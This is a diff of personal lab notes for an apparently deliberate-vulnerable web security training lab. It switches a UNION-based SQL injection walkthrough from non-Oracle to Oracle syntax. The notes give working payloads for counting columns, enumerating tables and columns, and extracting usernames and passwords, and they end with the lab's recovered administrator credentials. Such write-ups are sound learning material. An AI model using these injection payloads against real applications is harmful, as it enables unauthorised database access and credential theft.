@@ -23,17 +23,17 @@ https://0aa800070406644081b4b143006600ad.web-security-academy.net/filter?categor
 
 ' ORDER BY 3-- -
 
-*Error detected so there are only 2 columns. The cheat sheet has this for non-Oracle databases: You can list the tables that exist in the database, and the columns that those tables contain.*
+*Error detected so there are only 2 columns. The cheat sheet has this for Oracle databases: You can list the tables that exist in the database, and the columns that those tables contain.*
 
-SELECT * FROM information_schema.tables
+SELECT * FROM all_tables
 
-*information_schema.tables has all the tables and column table_name stores all the names of the tables*
+*all_tables has all the tables and column table_name stores all the names of the tables*
 
-https://0aa800070406644081b4b143006600ad.web-security-academy.net/filter?category=Gifts%27%20UNION%20SELECT%20table_name,NULL%20FROM%20information_schema.tables--%20-
+' UNION SELECT table_name, NULL FROM all_tables--
 
-*It shows a list of table names. ctrl+f users. Ignore pg suffix ones to find the ones that are the app's own. Saw this:*
+*It shows a list of table names. ctrl+f users. Saw this:*
 
-users_bmdkjj
+USERS_EXTJPN
 
 *Check the cheat sheet and find the column names in this table now*
 
@@ -41,17 +41,16 @@ users_bmdkjj
 
 *This returned the following columns:*
 
-username_uzxyzj
-email
-password_dwlqxj
+EMAIL
+PASSWORD_HLMBKG
+USERNAME_SQWXKY
 
 *I used these to get the admin credentials:*
 
-' UNION SELECT username_uzxyzj, password_dwlqxj FROM users_bmdkjj-- -
-
+' UNION SELECT USERNAME_SQWXKY, PASSWORD_HLMBKG FROM USERS_EXTJPN--
 
 **Answer:** 
 
 administrator
-ostzu59393dl3gwivr36
+2su3fvyoqrp5cwzn2zjn
 
